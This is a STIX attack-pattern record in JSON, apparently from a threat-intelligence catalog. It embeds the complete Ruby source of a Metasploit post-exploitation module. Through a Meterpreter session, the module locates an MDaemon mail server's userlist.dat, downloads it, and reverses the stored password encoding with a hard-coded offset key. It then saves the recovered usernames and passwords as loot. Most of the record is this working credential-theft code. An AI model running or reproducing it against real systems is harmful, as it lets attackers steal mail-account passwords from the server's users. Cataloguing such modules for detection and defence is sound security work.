{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f424fcde-1982-4bb0-8ab9-1da1404a59ba",
    "created": "2024-08-14T16:33:08.250576Z",
    "modified": "2024-08-14T16:33:08.25058Z",
    "name": "Windows Gather MDaemonEmailServer Credential Cracking",
    "description": "Finds and cracks the stored passwords of MDaemon Email Server 'References' => [ ['BID', '4686'] ] 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/mdaemon_cred_collector.rb",
            "external_id": "mdaemon_cred_collector.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'base64'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  Rank = ExcellentRanking\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather MDaemonEmailServer Credential Cracking',\n        'Description' => 'Finds and cracks the stored passwords of MDaemon Email Server',\n        'References' => [\n          ['BID', '4686']\n        ],\n        'License' => MSF_LICENSE,\n        'Author' => ['Manuel Nader #AgoraSecurity'],\n        'Platform' => ['win'],\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'SessionTypes' => ['meterpreter'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_close\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              stdapi_fs_ls\n              stdapi_fs_stat\n              stdapi_registry_query_value_direct\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        # If software is installed on a rare directory\n        OptString.new('RPATH', [false, 'Path of the MDaemon installation', false])\n      ]\n    )\n  end\n\n  def run\n    if session.type != 'meterpreter'\n      print_error('Only meterpreter sessions are supported by this post module')\n      return\n    end\n\n    progfiles_env = session.sys.config.getenvs('SYSTEMDRIVE', 'HOMEDRIVE', 'ProgramFiles', 'ProgramFiles(x86)', 'ProgramW6432')\n    locations = ['C:\\MDaemon\\App']\n    progfiles_env.each do |_k, v|\n      vprint_status(\"Searching MDaemon installation at #{v}\")\n      if session.fs.dir.entries(v).include? 'MDaemon'\n        vprint_status(\"Found MDaemon installation at #{v}\")\n        locations << v + '\\\\MDaemon\\\\'\n      end\n    end\n\n    keys = [\n      'HKLM\\\\SOFTWARE\\\\Alt-N Technologies\\\\MDaemon', # 64 bit. Has AppPath\n    ]\n\n    locations << datastore['RPATH'] if datastore['RPATH'].nil?\n\n    keys.each do |key|\n      begin\n        root_key, base_key = session.sys.registry.splitkey(key)\n        value = session.sys.registry.query_value_direct(root_key, base_key, 'AppPath')\n      rescue Rex::Post::Meterpreter::RequestError => e\n        vprint_error(e.message)\n        next\n      end\n      locations << value.data + '\\\\'\n    end\n    locations.uniq!\n    locations = locations.compact\n    userlist = check_mdaemons(locations)\n    get_mdaemon_creds(userlist) if userlist\n  end\n\n  def crack_password(raw_password)\n    vprint_status(\"Cracking #{raw_password}\")\n    offset = [84, 104, 101, 32, 115, 101, 116, 117, 112, 32, 112, 114, 111, 99, 101]\n    decode = Base64.decode64(raw_password).bytes\n    crack = decode\n    result = ''\n    (0..(crack.size - 1)).each do |i|\n      if (crack[i] - offset[i]) > 0\n        result << (crack[i] - offset[i])\n      else\n        result << ((crack[i] - offset[i]) + 128)\n      end\n    end\n    vprint_status(\"Password #{result}\")\n    result\n  end\n\n  def check_mdaemons(locations)\n    tmp_filename = (0...12).map { rand(65..90).chr }.join\n    begin\n      locations.each do |location|\n        vprint_status(\"Checking for Userlist in MDaemons directory at: #{location}\")\n        begin\n          session.fs.dir.foreach(location.to_s) do |fdir|\n            ['userlist.dat'].each do |datfile|\n              next if fdir.casecmp(datfile) != 0\n\n              filepath = location + '\\\\' + datfile\n              print_good(\"Configuration file found: #{filepath}\")\n              print_good(\"Found MDaemons on #{sysinfo['Computer']} via session ID: #{session.sid}\")\n              vprint_status(\"Downloading UserList.dat file to tmp file: #{tmp_filename}\")\n              session.fs.file.download_file(tmp_filename, filepath)\n              # userdat = session.fs.file.open(filepath).read.to_s.split(/\\n/)\n              return tmp_filename\n            end\n          end\n        rescue Rex::Post::Meterpreter::RequestError => e\n          vprint_error(e.message)\n        end\n      end\n    rescue StandardError => e\n      print_error(e.to_s)\n      return\n    end\n\n    nil\n  end\n\n  def parse_userlist(data)\n    # creds  = [\"['domain','mailbox','full_name','mail_dir','password']\"]\n    creds = []\n    pop3 = []\n    imap = []\n    users = 0\n    passwords = 0\n    file = File.open(data)\n    file.each do |line|\n      domain = line.slice(0..44).strip!\n      mailbox = line.slice(45..74).strip!\n      full_name = line.slice(75..104).strip!\n      mail_dir = line.slice(105..194).strip!\n      raw_password = line.slice(195..210)\n      password = crack_password(raw_password)\n      access = line.slice(217)\n      users += 1\n      passwords += 1\n      if access == 'Y' # IMAP & POP3\n        pop3 << [domain, mailbox, full_name, mail_dir, password]\n        imap << [domain, mailbox, full_name, mail_dir, password]\n      elsif access == 'P' # POP3\n        pop3 << [domain, mailbox, full_name, mail_dir, password]\n      elsif access == 'I' # IMAP\n        imap << [domain, mailbox, full_name, mail_dir, password]\n      end\n      # Saves all the passwords\n      creds << [domain, mailbox, full_name, mail_dir, password]\n    end\n    vprint_status('Collected the following credentials:')\n    vprint_status(\"    Usernames: #{users}\")\n    vprint_status(\"    Passwords: #{passwords}\")\n    vprint_status(\"Deleting tmp file: #{data}\")\n    del_cmd = 'rm '\n    del_cmd << data\n    system(del_cmd)\n    [creds, imap, pop3]\n  end\n\n  def report_mdaemon_cred(creds, port: 0, service: nil)\n    # Build service information\n    service_data = {\n      # address: session.session_host, # Gives internal IP\n      address: session.tunnel_peer.partition(':')[0], # Gives public IP\n      port: port,\n      service_name: 'smtp',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n    # Iterate through credentials\n    creds.each do |cred|\n      # Build credential information\n      credential_data = {\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        private_type: :password,\n        private_data: cred[4],\n        username: cred[1],\n        module_fullname: fullname\n      }\n      credential_data.merge!(service_data)\n      credential_core = create_credential(credential_data)\n\n      # Assemble the options hash for creating the Metasploit::Credential::Login object\n      login_data = {\n        core: credential_core,\n        status: Metasploit::Model::Login::Status::UNTRIED,\n        workspace_id: myworkspace_id\n      }\n\n      login_data.merge!(service_data)\n      create_credential_login(login_data)\n\n      print_status(\"    Extracted: #{credential_data[:username]}:#{credential_data[:private_data]}\")\n    end\n\n    # report the goods!\n    loot_path = store_loot(\n      'MDaemon.smtp_server.creds',\n      'text/csv',\n      session,\n      creds.to_csv,\n      \"mdaemon_#{service}_server_credentials.csv\",\n      \"MDaemon #{service.upcase} Users Credentials\"\n    )\n    print_status(\"#{service.upcase} credentials saved in: #{loot_path}\")\n  end\n\n  def get_mdaemon_creds(userlist)\n    (smtp, imap, pop3) = parse_userlist(userlist)\n    report_mdaemon_cred(smtp, port: 25, service: 'smtp')\n    report_mdaemon_cred(imap, port: 110, service: 'pop3')\n    report_mdaemon_cred(pop3, port: 143, service: 'imap')\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}